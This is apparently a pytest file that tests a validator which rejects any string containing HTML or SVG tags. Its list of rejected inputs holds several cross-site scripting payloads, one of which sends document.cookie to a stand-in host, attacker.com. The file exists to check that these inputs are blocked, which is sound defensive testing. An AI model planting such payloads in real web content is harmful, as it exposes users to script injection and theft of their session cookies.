import pytest
import re

# Assuming you place the function in a utils file, e.g., backend/utils/validation_utils.py
# from backend.utils.validation_utils import reject_html_svg

# Re-declaring here for the test context
def reject_html_svg(value: str) -> str:
    if value and re.search(r'<[^>]*>', value):
        raise ValueError("HTML and SVG content is not permitted")
    return value

class TestRejectHtmlSvg:
    def test_valid_inputs_pass(self):
        """Test that safe strings are returned unmodified."""
        assert reject_html_svg("Software Engineer") == "Software Engineer"
        assert reject_html_svg("Acme Corp, Inc.") == "Acme Corp, Inc."
        assert reject_html_svg("Email from HR: Let's chat!") == "Email from HR: Let's chat!"
        assert reject_html_svg("") == ""
        assert reject_html_svg(None) is None

    @pytest.mark.parametrize("malicious_input", [
        "<b>Bold Company</b>",
        "<svg><script>alert(1)</script></svg>",
        "Engineer <img src=x onerror=alert(1)>",
        "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
        "<iframe src=\"javascript:alert(1)\"></iframe>",
        "<foreignObject><math><br></math></foreignObject>"
    ])
    def test_invalid_inputs_raise_value_error(self, malicious_input):
        """Test that strings containing HTML/SVG tags raise a ValueError."""
        with pytest.raises(ValueError, match="HTML and SVG content is not permitted"):
            reject_html_svg(malicious_input)